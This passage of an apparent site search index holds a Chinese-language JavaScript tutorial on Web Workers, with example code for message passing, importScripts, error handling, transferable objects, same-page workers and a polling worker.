15 16 17 18 19 20 21 22 23 // worker.js // settings var num_workers = 10 ; var items_per_worker = 1000000 ; // start the workers var result = 0 ; var pending_workers = num_workers ; for ( var i = 0 ; i < num_workers ; i += 1 ) { var worker = new Worker ( 'core.js' ); worker . postMessage ( i * items_per_worker ); worker . postMessage (( i + 1 ) * items_per_worker ); worker . onmessage = storeResult ; } // handle the results function storeResult ( event ) { result += event . data ; pending_workers -= 1 ; if ( pending_workers <= 0 ) postMessage ( result ); // finished! } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cWorker \u7ebf\u7a0b\u5185\u90e8\u65b0\u5efa\u4e8610\u4e2a Worker \u7ebf\u7a0b\uff0c\u5e76\u4e14\u4f9d\u6b21\u5411\u8fd910\u4e2a Worker \u53d1\u9001\u6d88\u606f\uff0c\u544a\u77e5\u4e86\u8ba1\u7b97\u7684\u8d77\u70b9\u548c\u7ec8\u70b9\u3002\u8ba1\u7b97\u4efb\u52a1\u811a\u672c\u7684\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // core.js var start ; onmessage = getStart ; function getStart ( event ) { start = event . data ; onmessage = getEnd ; } var end ; function getEnd ( event ) { end = event . data ; onmessage = null ; work (); } function work () { var result = 0 ; for ( var i = start ; i < end ; i += 1 ) { // perform some complex calculation here result += 1 ; } postMessage ( result ); close (); } API \u00b6 \u4e3b\u7ebf\u7a0b \u00b6 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Worker() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u4f9b\u4e3b\u7ebf\u7a0b\u751f\u6210 Worker \u7ebf\u7a0b\u3002 1 var myWorker = new Worker ( jsUrl , options ); Worker() \u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u811a\u672c\u7684\u7f51\u5740\uff08\u5fc5\u987b\u9075\u5b88\u540c\u6e90\u653f\u7b56\uff09\uff0c\u8be5\u53c2\u6570\u662f\u5fc5\u9700\u7684\uff0c\u4e14\u53ea\u80fd\u52a0\u8f7d JS \u811a\u672c\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u53ef\u9009\u3002\u5b83\u7684\u4e00\u4e2a\u4f5c\u7528\u5c31\u662f\u6307\u5b9a Worker \u7684\u540d\u79f0\uff0c\u7528\u6765\u533a\u5206\u591a\u4e2a Worker \u7ebf\u7a0b\u3002 1 2 3 4 5 // \u4e3b\u7ebf\u7a0b var myWorker = new Worker ( 'worker.js' , { name : 'myWorker' }); // Worker \u7ebf\u7a0b self . name // myWorker Worker() \u6784\u9020\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a Worker \u7ebf\u7a0b\u5bf9\u8c61\uff0c\u7528\u6765\u4f9b\u4e3b\u7ebf\u7a0b\u64cd\u4f5c Worker\u3002Worker \u7ebf\u7a0b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5982\u4e0b\u3002 Worker.onerror\uff1a\u6307\u5b9a error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 Worker.onmessage\uff1a\u6307\u5b9a message \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53d1\u9001\u8fc7\u6765\u7684\u6570\u636e\u5728 Event.data \u5c5e\u6027\u4e2d\u3002 Worker.onmessageerror\uff1a\u6307\u5b9a messageerror \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u53d1\u9001\u7684\u6570\u636e\u65e0\u6cd5\u5e8f\u5217\u5316\u6210\u5b57\u7b26\u4e32\u65f6\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 Worker.postMessage()\uff1a\u5411 Worker \u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002 Worker.terminate()\uff1a\u7acb\u5373\u7ec8\u6b62 Worker \u7ebf\u7a0b\u3002 Worker \u7ebf\u7a0b \u00b6 Web Worker \u6709\u81ea\u5df1\u7684\u5168\u5c40\u5bf9\u8c61\uff0c\u4e0d\u662f\u4e3b\u7ebf\u7a0b\u7684 window \uff0c\u800c\u662f\u4e00\u4e2a\u4e13\u95e8\u4e3a Worker \u5b9a\u5236\u7684\u5168\u5c40\u5bf9\u8c61\u3002\u56e0\u6b64\u5b9a\u4e49\u5728 window \u4e0a\u9762\u7684\u5bf9\u8c61\u548c\u65b9\u6cd5\u4e0d\u662f\u5168\u90e8\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002 Worker \u7ebf\u7a0b\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5168\u5c40\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 self.name\uff1a Worker \u7684\u540d\u5b57\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u7531\u6784\u9020\u51fd\u6570\u6307\u5b9a\u3002 self.onmessage\uff1a\u6307\u5b9a message \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 self.onmessageerror\uff1a\u6307\u5b9a messageerror \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u53d1\u9001\u7684\u6570\u636e\u65e0\u6cd5\u5e8f\u5217\u5316\u6210\u5b57\u7b26\u4e32\u65f6\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 self.close()\uff1a\u5173\u95ed Worker \u7ebf\u7a0b\u3002 self.postMessage()\uff1a\u5411\u4ea7\u751f\u8fd9\u4e2a Worker \u7684\u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002 self.importScripts()\uff1a\u52a0\u8f7d JS \u811a\u672c\u3002 \uff08\u5b8c\uff09","title":"Web Worker"},{"location":"bom/webworker/#web-worker","text":"","title":"Web Worker"},{"location":"bom/webworker/#_1","text":"JavaScript \u8bed\u8a00\u91c7\u7528\u7684\u662f\u5355\u7ebf\u7a0b\u6a21\u578b\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6240\u6709\u4efb\u52a1\u53ea\u80fd\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u5b8c\u6210\uff0c\u4e00\u6b21\u53ea\u80fd\u505a\u4e00\u4ef6\u4e8b\u3002\u524d\u9762\u7684\u4efb\u52a1\u6ca1\u505a\u5b8c\uff0c\u540e\u9762\u7684\u4efb\u52a1\u53ea\u80fd\u7b49\u7740\u3002\u968f\u7740\u7535\u8111\u8ba1\u7b97\u80fd\u529b\u7684\u589e\u5f3a\uff0c\u5c24\u5176\u662f\u591a\u6838 CPU \u7684\u51fa\u73b0\uff0c\u5355\u7ebf\u7a0b\u5e26\u6765\u5f88\u5927\u7684\u4e0d\u4fbf\uff0c\u65e0\u6cd5\u5145\u5206\u53d1\u6325\u8ba1\u7b97\u673a\u7684\u8ba1\u7b97\u80fd\u529b\u3002 Web Worker \u7684\u4f5c\u7528\uff0c\u5c31\u662f\u4e3a JavaScript \u521b\u9020\u591a\u7ebf\u7a0b\u73af\u5883\uff0c\u5141\u8bb8\u4e3b\u7ebf\u7a0b\u521b\u5efa Worker \u7ebf\u7a0b\uff0c\u5c06\u4e00\u4e9b\u4efb\u52a1\u5206\u914d\u7ed9\u540e\u8005\u8fd0\u884c\u3002\u5728\u4e3b\u7ebf\u7a0b\u8fd0\u884c\u7684\u540c\u65f6\uff0cWorker \u7ebf\u7a0b\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u4e24\u8005\u4e92\u4e0d\u5e72\u6270\u3002\u7b49\u5230 Worker \u7ebf\u7a0b\u5b8c\u6210\u8ba1\u7b97\u4efb\u52a1\uff0c\u518d\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9\u4e3b\u7ebf\u7a0b\u3002\u8fd9\u6837\u7684\u597d\u5904\u662f\uff0c\u4e00\u4e9b\u8ba1\u7b97\u5bc6\u96c6\u578b\u6216\u9ad8\u5ef6\u8fdf\u7684\u4efb\u52a1\u53ef\u4ee5\u4ea4\u7531 Worker \u7ebf\u7a0b\u6267\u884c\uff0c\u4e3b\u7ebf\u7a0b\uff08\u901a\u5e38\u8d1f\u8d23 UI \u4ea4\u4e92\uff09\u80fd\u591f\u4fdd\u6301\u6d41\u7545\uff0c\u4e0d\u4f1a\u88ab\u963b\u585e\u6216\u62d6\u6162\u3002 Worker \u7ebf\u7a0b\u4e00\u65e6\u65b0\u5efa\u6210\u529f\uff0c\u5c31\u4f1a\u59cb\u7ec8\u8fd0\u884c\uff0c\u4e0d\u4f1a\u88ab\u4e3b\u7ebf\u7a0b\u4e0a\u7684\u6d3b\u52a8\uff08\u6bd4\u5982\u7528\u6237\u70b9\u51fb\u6309\u94ae\u3001\u63d0\u4ea4\u8868\u5355\uff09\u6253\u65ad\u3002\u8fd9\u6837\u6709\u5229\u4e8e\u968f\u65f6\u54cd\u5e94\u4e3b\u7ebf\u7a0b\u7684\u901a\u4fe1\u3002\u4f46\u662f\uff0c\u8fd9\u4e5f\u9020\u6210\u4e86 Worker \u6bd4\u8f83\u8017\u8d39\u8d44\u6e90\uff0c\u4e0d\u5e94\u8be5\u8fc7\u5ea6\u4f7f\u7528\uff0c\u800c\u4e14\u4e00\u65e6\u4f7f\u7528\u5b8c\u6bd5\uff0c\u5c31\u5e94\u8be5\u5173\u95ed\u3002 Web Worker \u6709\u4ee5\u4e0b\u51e0\u4e2a\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \uff081\uff09 \u540c\u6e90\u9650\u5236 \u5206\u914d\u7ed9 Worker \u7ebf\u7a0b\u8fd0\u884c\u7684\u811a\u672c\u6587\u4ef6\uff0c\u5fc5\u987b\u4e0e\u4e3b\u7ebf\u7a0b\u7684\u811a\u672c\u6587\u4ef6\u540c\u6e90\u3002 \uff082\uff09 DOM \u9650\u5236 Worker \u7ebf\u7a0b\u6240\u5728\u7684\u5168\u5c40\u5bf9\u8c61\uff0c\u4e0e\u4e3b\u7ebf\u7a0b\u4e0d\u4e00\u6837\uff0c\u65e0\u6cd5\u8bfb\u53d6\u4e3b\u7ebf\u7a0b\u6240\u5728\u7f51\u9875\u7684 DOM \u5bf9\u8c61\uff0c\u4e5f\u65e0\u6cd5\u4f7f\u7528 document \u3001 window \u3001 parent \u8fd9\u4e9b\u5bf9\u8c61\u3002\u4f46\u662f\uff0cWorker \u7ebf\u7a0b\u53ef\u4ee5\u4f7f\u7528 navigator \u5bf9\u8c61\u548c location \u5bf9\u8c61\u3002 \uff083\uff09 \u5168\u5c40\u5bf9\u8c61\u9650\u5236 Worker \u7684\u5168\u5c40\u5bf9\u8c61 WorkerGlobalScope \uff0c\u4e0d\u540c\u4e8e\u7f51\u9875\u7684\u5168\u5c40\u5bf9\u8c61 Window \uff0c\u5f88\u591a\u63a5\u53e3\u62ff\u4e0d\u5230\u3002\u6bd4\u5982\uff0c\u7406\u8bba\u4e0a Worker \u7ebf\u7a0b\u4e0d\u80fd\u4f7f\u7528 console.log \uff0c\u56e0\u4e3a\u6807\u51c6\u91cc\u9762\u6ca1\u6709\u63d0\u5230 Worker \u7684\u5168\u5c40\u5bf9\u8c61\u5b58\u5728 console \u63a5\u53e3\uff0c\u53ea\u5b9a\u4e49\u4e86 Navigator \u63a5\u53e3\u548c Location \u63a5\u53e3\u3002\u4e0d\u8fc7\uff0c\u6d4f\u89c8\u5668\u5b9e\u9645\u4e0a\u652f\u6301 Worker \u7ebf\u7a0b\u4f7f\u7528 console.log \uff0c\u4fdd\u9669\u7684\u505a\u6cd5\u8fd8\u662f\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 \uff084\uff09 \u901a\u4fe1\u8054\u7cfb Worker \u7ebf\u7a0b\u548c\u4e3b\u7ebf\u7a0b\u4e0d\u5728\u540c\u4e00\u4e2a\u4e0a\u4e0b\u6587\u73af\u5883\uff0c\u5b83\u4eec\u4e0d\u80fd\u76f4\u63a5\u901a\u4fe1\uff0c\u5fc5\u987b\u901a\u8fc7\u6d88\u606f\u5b8c\u6210\u3002 \uff085\uff09 \u811a\u672c\u9650\u5236 Worker \u7ebf\u7a0b\u4e0d\u80fd\u6267\u884c alert() \u65b9\u6cd5\u548c confirm() \u65b9\u6cd5\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 XMLHttpRequest \u5bf9\u8c61\u53d1\u51fa AJAX \u8bf7\u6c42\u3002 \uff086\uff09 \u6587\u4ef6\u9650\u5236 Worker \u7ebf\u7a0b\u65e0\u6cd5\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0c\u5373\u4e0d\u80fd\u6253\u5f00\u672c\u673a\u7684\u6587\u4ef6\u7cfb\u7edf\uff08 file:// \uff09\uff0c\u5b83\u6240\u52a0\u8f7d\u7684\u811a\u672c\uff0c\u5fc5\u987b\u6765\u81ea\u7f51\u7edc\u3002","title":"\u6982\u8ff0"},{"location":"bom/webworker/#_2","text":"","title":"\u57fa\u672c\u7528\u6cd5"},{"location":"bom/webworker/#_3","text":"\u4e3b\u7ebf\u7a0b\u91c7\u7528 new \u547d\u4ee4\uff0c\u8c03\u7528 Worker() \u6784\u9020\u51fd\u6570\uff0c\u65b0\u5efa\u4e00\u4e2a Worker \u7ebf\u7a0b\u3002 1 var worker = new Worker ( 'work.js' ); Worker() \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5c31\u662f Worker \u7ebf\u7a0b\u6240\u8981\u6267\u884c\u7684\u4efb\u52a1\u3002\u7531\u4e8e Worker \u4e0d\u80fd\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff0c\u6240\u4ee5\u8fd9\u4e2a\u811a\u672c\u5fc5\u987b\u6765\u81ea\u7f51\u7edc\u3002\u5982\u679c\u4e0b\u8f7d\u6ca1\u6709\u6210\u529f\uff08\u6bd4\u5982404\u9519\u8bef\uff09\uff0cWorker \u5c31\u4f1a\u9ed8\u9ed8\u5730\u5931\u8d25\u3002 \u7136\u540e\uff0c\u4e3b\u7ebf\u7a0b\u8c03\u7528 worker.postMessage() \u65b9\u6cd5\uff0c\u5411 Worker \u53d1\u6d88\u606f\u3002 1 2 worker . postMessage ( 'Hello World' ); worker . postMessage ({ method : 'echo' , args : [ 'Work' ]}); worker.postMessage() \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u5c31\u662f\u4e3b\u7ebf\u7a0b\u4f20\u7ed9 Worker \u7684\u6570\u636e\u3002\u5b83\u53ef\u4ee5\u662f\u5404\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u5305\u62ec\u4e8c\u8fdb\u5236\u6570\u636e\u3002 \u63a5\u7740\uff0c\u4e3b\u7ebf\u7a0b\u901a\u8fc7 worker.onmessage \u6307\u5b9a\u76d1\u542c\u51fd\u6570\uff0c\u63a5\u6536\u5b50\u7ebf\u7a0b\u53d1\u56de\u6765\u7684\u6d88\u606f\u3002 1 2 3 4 5 6 7 8 worker . onmessage = function ( event ) { doSomething ( event . data ); } function doSomething () { // \u6267\u884c\u4efb\u52a1 worker . postMessage ( 'Work done!' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e8b\u4ef6\u5bf9\u8c61\u7684 data \u5c5e\u6027\u53ef\u4ee5\u83b7\u53d6 Worker \u53d1\u6765\u7684\u6570\u636e\u3002 Worker \u5b8c\u6210\u4efb\u52a1\u4ee5\u540e\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u53ef\u4ee5\u628a\u5b83\u5173\u6389\u3002 1 worker . terminate ();","title":"\u4e3b\u7ebf\u7a0b"},{"location":"bom/webworker/#worker","text":"Worker \u7ebf\u7a0b\u5185\u90e8\u9700\u8981\u6709\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u76d1\u542c message \u4e8b\u4ef6\u3002 1 2 3 self . addEventListener ( 'message' , function ( e ) { self . postMessage ( 'You said: ' + e . data ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c self \u4ee3\u8868\u5b50\u7ebf\u7a0b\u81ea\u8eab\uff0c\u5373\u5b50\u7ebf\u7a0b\u7684\u5168\u5c40\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u7b49\u540c\u4e8e\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // \u5199\u6cd5\u4e00 this . addEventListener ( 'message' , function ( e ) { this . postMessage ( 'You said: ' + e . data ); }, false ); // \u5199\u6cd5\u4e8c addEventListener ( 'message' , function ( e ) { postMessage ( 'You said: ' + e . data ); }, false ); \u9664\u4e86\u4f7f\u7528 self.addEventListener() \u6307\u5b9a\u76d1\u542c\u51fd\u6570\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 self.onmessage \u6307\u5b9a\u3002\u76d1\u542c\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u5b83\u7684 data \u5c5e\u6027\u5305\u542b\u4e3b\u7ebf\u7a0b\u53d1\u6765\u7684\u6570\u636e\u3002 self.postMessage() \u65b9\u6cd5\u7528\u6765\u5411\u4e3b\u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002 \u6839\u636e\u4e3b\u7ebf\u7a0b\u53d1\u6765\u7684\u6570\u636e\uff0cWorker \u7ebf\u7a0b\u53ef\u4ee5\u8c03\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 self . addEventListener ( 'message' , function ( e ) { var data = e . data ; switch ( data . cmd ) { case 'start' : self . postMessage ( 'WORKER STARTED: ' + data . msg ); break ; case 'stop' : self . postMessage ( 'WORKER STOPPED: ' + data . msg ); self . close (); // Terminates the worker. break ; default : self . postMessage ( 'Unknown command: ' + data . msg ); }; }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c self.close() \u7528\u4e8e\u5728 Worker \u5185\u90e8\u5173\u95ed\u81ea\u8eab\u3002","title":"Worker \u7ebf\u7a0b"},{"location":"bom/webworker/#worker_1","text":"Worker \u5185\u90e8\u5982\u679c\u8981\u52a0\u8f7d\u5176\u4ed6\u811a\u672c\uff0c\u6709\u4e00\u4e2a\u4e13\u95e8\u7684\u65b9\u6cd5 importScripts() \u3002 1 importScripts ( 'script1.js' ); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u540c\u65f6\u52a0\u8f7d\u591a\u4e2a\u811a\u672c\u3002 1 importScripts ( 'script1.js' , 'script2.js' );","title":"Worker \u52a0\u8f7d\u811a\u672c"},{"location":"bom/webworker/#_4","text":"\u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u76d1\u542c Worker \u662f\u5426\u53d1\u751f\u9519\u8bef\u3002\u5982\u679c\u53d1\u751f\u9519\u8bef\uff0cWorker \u4f1a\u89e6\u53d1\u4e3b\u7ebf\u7a0b\u7684 error \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 worker . onerror = function ( event ) { console . log ( 'ERROR: Line ' , event . lineno , ' in ' , event . filename , ': ' , event . message ); }; // \u6216\u8005 worker . addEventListener ( 'error' , function ( event ) { // ... }); Worker \u5185\u90e8\u4e5f\u53ef\u4ee5\u76d1\u542c error \u4e8b\u4ef6\u3002","title":"\u9519\u8bef\u5904\u7406"},{"location":"bom/webworker/#worker_2","text":"\u4f7f\u7528\u5b8c\u6bd5\uff0c\u4e3a\u4e86\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\uff0c\u5fc5\u987b\u5173\u95ed Worker\u3002 1 2 3 4 5 // \u4e3b\u7ebf\u7a0b worker . terminate (); // Worker \u7ebf\u7a0b self . close ();","title":"\u5173\u95ed Worker"},{"location":"bom/webworker/#_5","text":"\u524d\u9762\u8bf4\u8fc7\uff0c\u4e3b\u7ebf\u7a0b\u4e0e Worker \u4e4b\u95f4\u7684\u901a\u4fe1\u5185\u5bb9\uff0c\u53ef\u4ee5\u662f\u6587\u672c\uff0c\u4e5f\u53ef\u4ee5\u662f\u5bf9\u8c61\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u79cd\u901a\u4fe1\u662f\u62f7\u8d1d\u5173\u7cfb\uff0c\u5373\u662f\u4f20\u503c\u800c\u4e0d\u662f\u4f20\u5740\uff0cWorker \u5bf9\u901a\u4fe1\u5185\u5bb9\u7684\u4fee\u6539\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u4e3b\u7ebf\u7a0b\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6d4f\u89c8\u5668\u5185\u90e8\u7684\u8fd0\u884c\u673a\u5236\u662f\uff0c\u5148\u5c06\u901a\u4fe1\u5185\u5bb9\u4e32\u884c\u5316\uff0c\u7136\u540e\u628a\u4e32\u884c\u5316\u540e\u7684\u5b57\u7b26\u4e32\u53d1\u7ed9 Worker\uff0c\u540e\u8005\u518d\u5c06\u5b83\u8fd8\u539f\u3002 \u4e3b\u7ebf\u7a0b\u4e0e Worker \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u4ea4\u6362\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982 File\u3001Blob\u3001ArrayBuffer \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5728\u7ebf\u7a0b\u4e4b\u95f4\u53d1\u9001\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u4e3b\u7ebf\u7a0b var uInt8Array = new Uint8Array ( new ArrayBuffer ( 10 )); for ( var i = 0 ; i < uInt8Array . length ; ++ i ) { uInt8Array [ i ] = i * 2 ; // [0, 2, 4, 6, 8,...] } worker . postMessage ( uInt8Array ); // Worker \u7ebf\u7a0b self . onmessage = function ( e ) { var uInt8Array = e . data ; postMessage ( 'Inside worker.js: uInt8Array.toString() = ' + uInt8Array . toString ()); postMessage ( 'Inside worker.js: uInt8Array.byteLength = ' + uInt8Array . byteLength ); }; \u4f46\u662f\uff0c\u62f7\u8d1d\u65b9\u5f0f\u53d1\u9001\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4f1a\u9020\u6210\u6027\u80fd\u95ee\u9898\u3002\u6bd4\u5982\uff0c\u4e3b\u7ebf\u7a0b\u5411 Worker \u53d1\u9001\u4e00\u4e2a 500MB \u6587\u4ef6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6d4f\u89c8\u5668\u4f1a\u751f\u6210\u4e00\u4e2a\u539f\u6587\u4ef6\u7684\u62f7\u8d1d\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cJavaScript \u5141\u8bb8\u4e3b\u7ebf\u7a0b\u628a\u4e8c\u8fdb\u5236\u6570\u636e\u76f4\u63a5\u8f6c\u79fb\u7ed9\u5b50\u7ebf\u7a0b\uff0c\u4f46\u662f\u4e00\u65e6\u8f6c\u79fb\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u65e0\u6cd5\u518d\u4f7f\u7528\u8fd9\u4e9b\u4e8c\u8fdb\u5236\u6570\u636e\u4e86\uff0c\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u4fee\u6539\u6570\u636e\u7684\u9ebb\u70e6\u5c40\u9762\u3002\u8fd9\u79cd\u8f6c\u79fb\u6570\u636e\u7684\u65b9\u6cd5\uff0c\u53eb\u505a Transferable Objects \u3002\u8fd9\u4f7f\u5f97\u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u5feb\u901f\u628a\u6570\u636e\u4ea4\u7ed9 Worker\uff0c\u5bf9\u4e8e\u5f71\u50cf\u5904\u7406\u3001\u58f0\u97f3\u5904\u7406\u30013D \u8fd0\u7b97\u7b49\u5c31\u975e\u5e38\u65b9\u4fbf\u4e86\uff0c\u4e0d\u4f1a\u4ea7\u751f\u6027\u80fd\u8d1f\u62c5\u3002 \u5982\u679c\u8981\u76f4\u63a5\u8f6c\u79fb\u6570\u636e\u7684\u63a7\u5236\u6743\uff0c\u5c31\u8981\u4f7f\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 // Transferable Objects \u683c\u5f0f worker . postMessage ( arrayBuffer , [ arrayBuffer ]); // \u4f8b\u5b50 var ab = new ArrayBuffer ( 1 ); worker . postMessage ( ab , [ ab ]);","title":"\u6570\u636e\u901a\u4fe1"},{"location":"bom/webworker/#web-worker_1","text":"\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cWorker \u8f7d\u5165\u7684\u662f\u4e00\u4e2a\u5355\u72ec\u7684 JavaScript \u811a\u672c\u6587\u4ef6\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u8f7d\u5165\u4e0e\u4e3b\u7ebf\u7a0b\u5728\u540c\u4e00\u4e2a\u7f51\u9875\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 <!DOCTYPE html> < body > < script id = \"worker\" type = \"app/worker\" > addEventListener ( 'message' , function () { postMessage ( 'some message' ); }, false ); </ script > </ body > </ html > \u4e0a\u9762\u662f\u4e00\u6bb5\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\uff0c\u6ce8\u610f\u5fc5\u987b\u6307\u5b9a <script> \u6807\u7b7e\u7684 type \u5c5e\u6027\u662f\u4e00\u4e2a\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\u7684\u503c\uff0c\u4e0a\u4f8b\u662f app/worker \u3002 \u7136\u540e\uff0c\u8bfb\u53d6\u8fd9\u4e00\u6bb5\u5d4c\u5165\u9875\u9762\u7684\u811a\u672c\uff0c\u7528 Worker \u6765\u5904\u7406\u3002 1 2 3 4 5 6 7 var blob = new Blob ([ document . querySelector ( '#worker' ). textContent ]); var url = window . URL . createObjectURL ( blob ); var worker = new Worker ( url ); worker . onmessage = function ( e ) { // e.data === 'some message' }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u5c06\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\u4ee3\u7801\uff0c\u8f6c\u6210\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff0c\u7136\u540e\u4e3a\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u5bf9\u8c61\u751f\u6210 URL\uff0c\u518d\u8ba9 Worker \u52a0\u8f7d\u8fd9\u4e2a URL\u3002\u8fd9\u6837\u5c31\u505a\u5230\u4e86\uff0c\u4e3b\u7ebf\u7a0b\u548c Worker \u7684\u4ee3\u7801\u90fd\u5728\u540c\u4e00\u4e2a\u7f51\u9875\u4e0a\u9762\u3002","title":"\u540c\u9875\u9762\u7684 Web Worker"},{"location":"bom/webworker/#worker_3","text":"\u6709\u65f6\uff0c\u6d4f\u89c8\u5668\u9700\u8981\u8f6e\u8be2\u670d\u52a1\u5668\u72b6\u6001\uff0c\u4ee5\u4fbf\u7b2c\u4e00\u65f6\u95f4\u5f97\u77e5\u72b6\u6001\u6539\u53d8\u3002\u8fd9\u4e2a\u5de5\u4f5c\u53ef\u4ee5\u653e\u5728 Worker \u91cc\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function createWorker ( f ) { var blob = new Blob ([ '(' + f . toString () + ')()' ]); var url = window . URL . createObjectURL ( blob ); var worker = new Worker ( url ); return worker ; } var pollingWorker = createWorker ( function ( e ) { var cache ; function compare ( new , old ) { ... }; setInterval ( function () { fetch ( '/my-api-endpoint' ). then ( function ( res ) { var data = res . json (); if ( ! compare ( data , cache )) { cache = data ; self . postMessage ( data ); } }) }, 1000 ) }); pollingWorker . onmessage = function () { // render data } pollingWorker . postMessage ( 'init' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cWorker \u6bcf\u79d2\u949f\u8f6e\u8be2\u4e00\u6b21\u6570\u636e\uff0c\u7136\u540e\u8ddf\u7f13\u5b58\u505a\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u4e00\u81f4\uff0c\u5c31\u8bf4\u660e\u670d\u52a1\u7aef\u6709\u4e86\u65b0\u7684\u53d8\u5316\uff0c\u56e0\u6b64\u5c31\u8981\u901a\u77e5\u4e3b\u7ebf\u7a0b\u3002","title":"\u5b9e\u4f8b\uff1aWorker \u7ebf\u7a0b\u5b8c\u6210\u8f6e\u8be2"},{"location":"bom/webworker/#worker-worker","text":"Worker \u7ebf\u7a0b\u5185\u90e8\u8fd8\u80fd\u518d\u65b0\u5efa Worker \u7ebf\u7a0b\uff08\u76ee\u524d\u53ea\u6709 Firefox \u6d4f\u89c8\u5668\u652f\u6301\uff09\u3002\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u5c06\u4e00\u4e2a\u8ba1\u7b97\u5bc6\u96c6\u7684\u4efb\u52a1\uff0c\u5206\u914d\u523010\u4e2a Worker\u3002 \u4e3b\u7ebf\u7a0b\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 var worker = new Worker ( 'worker.js' ); worker . onmessage = function ( event ) { document . getElementById ( 'result' ). textContent = event . data ; }; Worker \u7ebf\u7a0b\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 